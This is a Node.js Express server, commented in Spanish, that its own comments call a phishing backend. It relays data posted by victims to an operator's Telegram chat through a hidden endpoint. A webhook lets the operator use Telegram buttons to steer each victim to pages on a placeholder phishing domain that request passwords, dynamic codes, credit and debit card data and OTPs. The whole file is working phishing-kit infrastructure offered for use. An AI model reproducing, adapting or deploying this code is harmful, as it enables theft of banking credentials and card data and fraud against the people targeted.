import express from 'express';
import cors from 'cors';

const app = express();

// CORS permisivo para que funcione desde file:// y localhost (phishing local)
app.use(cors({
  origin: function (origin, callback) {
    if (!origin || origin === 'null' || origin.includes('localhost')) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type']
}));

app.options('*', cors());

app.use(express.json());

// Variables de entorno (Render las inyecta)
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const SECRET_PATH = process.env.SECRET_PATH || 'x7k9p2m-q8z-send-v3';

if (!TELEGRAM_TOKEN || !CHAT_ID) {
  console.error('Faltan TELEGRAM_TOKEN o TELEGRAM_CHAT_ID en variables de entorno');
  process.exit(1);
}

// Ruta principal: enviar mensaje inicial con botones
app.post(`/${SECRET_PATH}`, async (req, res) => {
  try {
    const body = req.body;
    if (!body || !body.text) {
      return res.status(400).json({ ok: false, error: 'Falta texto del mensaje' });
    }

    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        ...body,
        chat_id: CHAT_ID,
      }),
    });

    const data = await response.json();
    res.status(response.status).json(data);
  } catch (error) {
    console.error('Error enviando mensaje:', error);
    res.status(500).json({ ok: false, error: 'Error interno' });
  }
});

// ────────────────────────────────────────────────────────────────
// WEBHOOK PRINCIPAL - Aquí Telegram envía TODOS los updates (incluyendo callbacks)
app.post('/webhook', async (req, res) => {
  try {
    const update = req.body;

    // Solo procesamos callbacks por ahora
    if (update.callback_query) {
      const cq = update.callback_query;
      const data = cq.data;
      const chatId = cq.message.chat.id;
      const messageId = cq.message.message_id;

      console.log('Callback recibido:', data);

      // 1. Responder al callback (quita el loading en el botón)
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          callback_query_id: cq.id,
          // show_alert: true, text: 'Procesando...'  ← opcional
        })
      });

      // 2. Eliminar los botones inline
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageReplyMarkup`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          message_id: messageId,
          reply_markup: { inline_keyboard: [] }
        })
      });

      // 3. Mapear callback_data → URL de redirección (cambia el dominio por el tuyo real)
      let redirectUrl = '';

      if (data.startsWith('error_logo:')) {
        redirectUrl = 'https://tu-dominio-phishing.com/index1.html';
      } else if (data.startsWith('error_clave:')) {
        redirectUrl = 'https://tu-dominio-phishing.com/index2.html';
      } else if (data.startsWith('pedir_dinamica:')) {
        redirectUrl = 'https://tu-dominio-phishing.com/index3.html';
      } else if (data.startsWith('error_dinamica:')) {
        redirectUrl = 'https://tu-dominio-phishing.com/error_dinamica.html';
      } else if (data.startsWith('pedir_tc:')) {
        redirectUrl = 'https://tu-dominio-phishing.com/desembolso.html';
      } else if (data.startsWith('error_tc:')) {
        redirectUrl = 'https://tu-dominio-phishing.com/desembolso.html?error=true';
      } else if (data.startsWith('pedir_td:')) {
        redirectUrl = 'https://tu-dominio-phishing.com/tarjeta_debito.html';
      } else if (data.startsWith('error_td:')) {
        redirectUrl = 'https://tu-dominio-phishing.com/tarjeta_debito.html?error=true';
      } else if (data.startsWith('soy:')) {
        redirectUrl = 'https://tu-dominio-phishing.com/soyyo.html';
      } else if (data.startsWith('otp:')) {
        redirectUrl = 'https://tu-dominio-phishing.com/otp.html';
      } else if (data.startsWith('error_otp:')) {
        redirectUrl = 'https://tu-dominio-phishing.com/otp.html?error=true';
      } else if (data.startsWith('finalizar:')) {
        redirectUrl = 'https://tu-dominio-phishing.com/final1.html';
      }

      // 4. Enviar mensaje con el link de continuación
      if (redirectUrl) {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: `Continúa el proceso aquí:\n${redirectUrl}\n\n(Enlace de verificación)`,
            parse_mode: 'HTML',
            disable_web_page_preview: true   // evita que Telegram genere preview
          })
        });
      }
    }

    res.sendStatus(200); // Telegram necesita 200 rápido
  } catch (err) {
    console.error('Error procesando webhook:', err);
    res.sendStatus(500);
  }
});

// Health check para Render
app.get('/health', (req, res) => {
  res.json({ status: 'ok' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Servidor escuchando en puerto ${PORT}`);
  console.log(`Webhook: /webhook`);
  console.log(`Envío inicial: /${SECRET_PATH}`);
});
